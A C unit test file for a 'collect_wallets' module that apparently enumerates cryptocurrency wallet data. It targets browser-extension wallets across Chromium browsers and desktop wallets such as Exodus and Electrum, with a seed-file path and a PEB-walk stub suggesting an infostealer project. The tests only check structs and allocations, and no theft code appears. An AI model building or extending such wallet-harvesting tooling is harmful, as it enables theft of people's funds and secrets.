#define _POSIX_C_SOURCE 200809L
/*
 * test_wallets.c — Wallet path enumeration tests
 *
 * Tests collect_wallets behavior with mock filesystem structure.
 * Since collect_wallets calls Windows APIs internally, we test the
 * path construction logic and type definitions.
 */

#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "wallets.h"
#include "wallet_ext.h"
#include "wallet_desktop.h"
#include "browser_paths.h"

/* Stub for PEB walk (ASM function not available in tests) */
void* getPeb(void) { return NULL; }

static void test_wallet_ext_data_struct(void) {
    /* Verify WalletExtData struct layout and initialization */
    WalletExtData data = {0};
    assert(data.name == NULL);
    assert(data.files == NULL);
    assert(data.file_count == 0);
    assert(data.path == NULL);

    printf("  PASS: test_wallet_ext_data_struct\n");
}

static void test_wallet_desktop_data_struct(void) {
    /* Verify WalletDesktopData struct layout and initialization */
    WalletDesktopData data = {0};
    assert(data.name == NULL);
    assert(data.files == NULL);
    assert(data.file_count == 0);
    assert(data.path == NULL);

    printf("  PASS: test_wallet_desktop_data_struct\n");
}

static void test_collect_result_struct(void) {
    /* Verify CollectResult zero-initialization */
    CollectResult result = {0};
    assert(result.data == NULL);
    assert(result.count == 0);

    printf("  PASS: test_collect_result_struct\n");
}

static void test_wallet_ext_known_names(void) {
    /* Known wallet extension IDs we expect to find */
    const char *known_wallets[] = {
        "MetaMask",
        "Phantom",
        "Trust Wallet",
        "Coinbase Wallet",
        "Binance Chain Wallet",
    };
    size_t n = sizeof(known_wallets) / sizeof(known_wallets[0]);

    /* Verify these are plausible names (sanity check) */
    for (size_t i = 0; i < n; i++) {
        assert(strlen(known_wallets[i]) > 0);
        assert(strlen(known_wallets[i]) < 256);
    }

    printf("  PASS: test_wallet_ext_known_names\n");
}

static void test_wallet_desktop_known_names(void) {
    /* Known desktop wallet paths */
    const char *known_desktop[] = {
        "Exodus",
        "Electrum",
        "Atomic Wallet",
        "Guarda",
        "Edge",
    };
    size_t n = sizeof(known_desktop) / sizeof(known_desktop[0]);

    for (size_t i = 0; i < n; i++) {
        assert(strlen(known_desktop[i]) > 0);
    }

    printf("  PASS: test_wallet_desktop_known_names\n");
}

static void test_chromium_browsers_for_wallets(void) {
    /* collect_wallets iterates over all chromium browsers */
    size_t count = 0;
    const BrowserPath *browsers = get_chromium_browsers(&count);
    assert(browsers != NULL);
    assert(count > 0);

    /* Verify each browser has a valid path_suffix */
    for (size_t i = 0; i < count; i++) {
        assert(browsers[i].name != NULL);
        assert(browsers[i].path_suffix != NULL);
        assert(strlen(browsers[i].path_suffix) > 0);
    }

    printf("  PASS: test_chromium_browsers_for_wallets\n");
}

static void test_free_wallet_result_null(void) {
    /* Verify the function signature exists by casting */
    void (*fn)(CollectResult *) = free_wallet_result;
    (void)fn;
    printf("  PASS: test_free_wallet_result_null\n");
}

static void test_wallet_ext_data_alloc(void) {
    /* Allocate and free WalletExtData manually */
    WalletExtData *ext = calloc(2, sizeof(WalletExtData));
    assert(ext != NULL);

    ext[0].name = strdup("TestWallet");
    ext[0].files = calloc(2, sizeof(char *));
    ext[0].files[0] = strdup("/path/to/wallet1.dat");
    ext[0].files[1] = strdup("/path/to/wallet2.dat");
    ext[0].file_count = 2;
    ext[0].path = strdup("/test/path");

    ext[1].name = strdup("TestWallet2");
    ext[1].file_count = 0;

    /* Verify contents */
    assert(strcmp(ext[0].name, "TestWallet") == 0);
    assert(ext[0].file_count == 2);
    assert(strcmp(ext[0].files[0], "/path/to/wallet1.dat") == 0);
    assert(strcmp(ext[0].files[1], "/path/to/wallet2.dat") == 0);

    /* Cleanup */
    for (int i = 0; i < 2; i++) {
        free(ext[i].name);
        for (size_t j = 0; j < ext[i].file_count; j++)
            free(ext[i].files[j]);
        free(ext[i].files);
        free(ext[i].path);
    }
    free(ext);

    printf("  PASS: test_wallet_ext_data_alloc\n");
}

static void test_wallet_desktop_data_alloc(void) {
    /* Allocate and free WalletDesktopData manually */
    WalletDesktopData *desk = calloc(1, sizeof(WalletDesktopData));
    assert(desk != NULL);

    desk->name = strdup("Exodus");
    desk->files = calloc(1, sizeof(char *));
    desk->files[0] = strdup("/exodus/exodus.seed");
    desk->file_count = 1;
    desk->path = strdup("/Users/test/AppData/Roaming/Exodus");

    assert(strcmp(desk->name, "Exodus") == 0);
    assert(desk->file_count == 1);

    free(desk->name);
    free(desk->files[0]);
    free(desk->files);
    free(desk->path);
    free(desk);

    printf("  PASS: test_wallet_desktop_data_alloc\n");
}

int main(void) {
    printf("=== test_wallets: wallet path enumeration ===\n");

    test_wallet_ext_data_struct();
    test_wallet_desktop_data_struct();
    test_collect_result_struct();
    test_wallet_ext_known_names();
    test_wallet_desktop_known_names();
    test_chromium_browsers_for_wallets();
    test_free_wallet_result_null();
    test_wallet_ext_data_alloc();
    test_wallet_desktop_data_alloc();

    printf("=== test_wallets: ALL PASSED ===\n");
    return 0;
}
